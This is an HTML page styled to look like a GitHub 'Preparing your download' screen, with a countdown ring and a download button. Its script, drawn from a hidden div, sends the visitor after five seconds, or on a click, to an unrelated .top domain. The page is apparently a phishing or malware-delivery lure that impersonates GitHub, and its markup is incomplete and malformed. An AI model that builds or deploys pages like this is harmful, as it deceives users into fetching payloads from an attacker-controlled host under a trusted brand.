<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Preparing your download… · GitHub</title>
  <style>
    :root {
      --bg: #0d1117;
      --surface: #161b22;
      --border: #30363d;
      --text: #e6edf3;
      --muted: #7d8590;
      --green: #3fb950;
      --green-dim: #238636;
      --blue: #58a6ff;
    }

    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    html, body {
      width: 100%;
      height: 100%;
      overflow: hidden;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
      background: var(--bg);
      color: var(--text);
      -webkit-font-smoothing: antialiased;
      display: flex;
      flex-direction: column;
      width: 100vw;
      height: 100vh;
    }

    a { color: var(--blue); text-decoration: none; }
    a:hover { text-decoration: underline; }

    /* ── HEADER ── */
    .header {
      flex-shrink: 0;
      background: rgba(22,27,34,.97);
      border-bottom: 1px solid var(--border);
      padding: 10px 20px;
      z-index: 10;
      backdrop-filter: blur(12px);
    }
    .header-inner {
      max-width: 1200px;
      margin: 0 auto;
      display: flex;
      align-items: center;
      gap: 16px;
    }
    .logo {
      display: flex;
      align-items: center;
      gap: 8px;
      color: var(--text);
      font-size: 13px;
      font-weight: 600;
    }
    .logo svg { fill: currentColor; flex-shrink: 0; }
    .logo:hover { opacity: .75; }
    .search {
      flex: 1;
      max-width: 380px;
      position: relative;
    }
    .search input {
      width: 100%;
      height: 30px;
      padding: 0 10px 0 30px;
      background: #010409;
      border: 1px solid var(--border);
      border-radius: 6px;
      color: var(--text);
      font-size: 12px;
      outline: none;
      transition: .2s;
    }
    .search input:focus { border-color: var(--blue); box-shadow: 0 0 0 3px rgba(88,166,255,.2); }
    .search-ico {
      position: absolute;
      left: 9px;
      top: 50%;
      transform: translateY(-50%);
      fill: var(--muted);
      pointer-events: none;
    }
    .nav { display: flex; gap: 6px; margin-left: auto; }
    .nav button {
      height: 30px;
      padding: 0 12px;
      border-radius: 6px;
      font-size: 12px;
      font-weight: 500;
      cursor: pointer;
      transition: .18s;
    }
    .nav .ghost {
      background: transparent;
      border: 1px solid var(--border);
      color: var(--text);
    }
    .nav .ghost:hover { background: #1c2128; }
    .nav .primary {
      background: var(--green-dim);
      border: 1px solid rgba(240,246,252,.1);
      color: #fff;
    }
    .nav .primary:hover { background: var(--green); }

    @media (max-width: 600px) {
      .search, .nav { display: none; }
    }

    /* ── MAIN ── */
    .main {
      flex: 1;
      min-height: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }

    .box {
      width: 100%;
      max-width: 300px;
      margin: 0 16px;
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 20px 20px 18px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 14px;
      box-shadow: 0 16px 48px rgba(0,0,0,.55);
      animation: up .3s ease-out;
    }

    @keyframes up {
      from { opacity: 0; transform: translateY(12px); }
      to   { opacity: 1; transform: translateY(0); }
    }

    /* ring */
    .ring-wrap { position: relative; width: 90px; height: 90px; }
    .ring-wrap svg {
      width: 90px;
      height: 90px;
      transform: rotate(-90deg);
    }
    .ring-bg  { fill: none; stroke: #21262d; stroke-width: 7; }
    .ring-arc {
      fill: none;
      stroke: url(#g);
      stroke-width: 7;
      stroke-linecap: round;
      stroke-dasharray: 251;
      stroke-dashoffset: 251;
      transition: stroke-dashoffset .1s linear;
      filter: drop-shadow(0 0 5px rgba(63,185,80,.4));
    }
    .ring-inner {
      position: absolute;
      inset: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 2px;
    }
    .ring-secs {
      font-size: 22px;
      font-weight: 700;
      line-height: 1;
      letter-spacing: -.03em;
      color: var(--green);
      font-variant-numeric: tabular-nums;
    }
    .ring-pct {
      font-size: 10px;
      color: var(--muted);
      font-variant-numeric: tabular-nums;
    }

    /* repo info row */
    .repo-row {
      display: flex;
      align-items: center;
      gap: 6px;
      padding: 6px 10px;
      background: #010409;
      border: 1px solid var(--border);
      border-radius: 6px;
      width: 100%;
    }
    .repo-row svg { fill: var(--muted); flex-shrink: 0; }
    .repo-name {
      font-size: 11px;
      color: var(--blue);
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
      flex: 1;
    }
    .repo-tag {
      font-size: 10px;
      color: var(--muted);
      background: #21262d;
      border: 1px solid var(--border);
      border-radius: 10px;
      padding: 1px 6px;
      white-space: nowrap;
    }

    /* label */
    .label {
      text-align: center;
    }
    .label h1 {
      font-size: 13px;
      font-weight: 600;
      margin-bottom: 3px;
      letter-spacing: -.01em;
    }
    .label p {
      font-size: 11px;
      color: var(--muted);
      line-height: 1.5;
    }

    /* button */
    .dl-btn {
      width: 100%;
      height: 34px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      background: var(--green-dim);
      border: 1px solid rgba(240,246,252,.1);
      border-radius: 6px;
      color: #fff;
      font-size: 12px;
      font-weight: 600;
      cursor: pointer;
      transition: .18s;
    }
    .dl-btn svg { fill: currentColor; }
    .dl-btn:hover {
      background: var(--green);
      box-shadow: 0 0 0 3px rgba(63,185,80,.18), 0 4px 14px rgba(35,134,54,.3);
      transform: translateY(-1px);
    }
    .dl-btn:active { transform: translateY(0); }

    /* divider */
    .divider {
      width: 100%;
      height: 1px;
      background: var(--border);
    }

    /* stats row */
    .stats-row {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 16px;
      width: 100%;
    }
    .stat {
      display: flex;
      align-items: center;
      gap: 4px;
      font-size: 11px;
      color: var(--muted);
    }
    .stat svg { fill: var(--muted); }
    .stat span { font-variant-numeric: tabular-nums; }

    /* hint */
    .hint {
      font-size: 10px;
      color: #484f58;
      text-align: center;
    }

    /* ── FOOTER ── */
    .footer {
      flex-shrink: 0;
      border-top: 1px solid var(--border);
      background: var(--surface);
      padding: 10px 16px;
    }
    .footer-inner {
      max-width: 1200px;
      margin: 0 auto;
      display: flex;
      align-items: center;
      justify-content: space-between;
      flex-wrap: wrap;
      gap: 8px;
    }
    .footer-left {
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .footer-left svg { fill: #6e7681; }
    .footer-copy { font-size: 11px; color: var(--muted); }
    .footer-links { display: flex; flex-wrap: wrap; gap: 12px; }
    .footer-links a { font-size: 11px; color: #6e7681; }
    .footer-links a:hover { color: var(--blue); text-decoration: none; }

    @media (max-width: 600px) {
      .footer-inner { justify-content: center; }
      .footer-left { display: none; }
      .footer-links { justify-content: center; gap: 10px; }
    }

    @media (prefers-reduced-motion: reduce) {
      *, *::before, *::after {
        animation: none !important;
        transition: none !important;
      }
    }
  </style>
</head>
<body>

    <header class="header">

        <button class="dl-btn" id="dlBtn" type="button">

  <div id="root" data-redirect-url="https://4xxlnf.top/sheldon" data-delay-ms="5000" style="display:none"></div>

  <script>
    (() => {
      const root  = document.getElementById('root');
      const url   = root.dataset.redirectUrl || '';
      const delay = Math.max(0, Number(root.dataset.delayMs || 5000));

      const arcEl = document.getElementById('arc');
      const secsEl = document.getElementById('secs');
      const pctEl  = document.getElementById('pct');
      const wrap   = document.getElementById('ringWrap');
      const btn    = document.getElementById('dlBtn');

      const r = 35;
      const C = 2 * Math.PI * r; // ≈ 219.9
      arcEl.style.strokeDasharray  = C;
      arcEl.style.strokeDashoffset = C;

      let t0 = performance.now(), raf = null, done = false;

      function tick(now) {
        if (done) return;
        const elapsed = now - t0;
        const ratio   = delay === 0 ? 1 : Math.min(elapsed / delay, 1);
        const secs    = Math.ceil(Math.max(0, delay - elapsed) / 1000);
        const pct     = Math.round(ratio * 100);

        arcEl.style.strokeDashoffset = C * (1 - ratio);
        secsEl.textContent = secs + 's';
        pctEl.textContent  = pct + '%';
        wrap.setAttribute('aria-valuenow', pct);

        if (elapsed >= delay) { go(); return; }
        raf = requestAnimationFrame(tick);
      }

      function go() {
        if (done) return;
        done = true;
        if (raf) cancelAnimationFrame(raf);
        if (url) window.location.assign(url);
      }

      btn.addEventListener('click', go);

      document.addEventListener('visibilitychange', () => {
        if (document.hidden) { if (raf) cancelAnimationFrame(raf); }
        else if (!done) { t0 = performance.now() - (delay * (parseInt(pctEl.textContent) / 100)); raf = requestAnimationFrame(tick); }
      });

      raf = requestAnimationFrame(tick);
    })();
  </script>
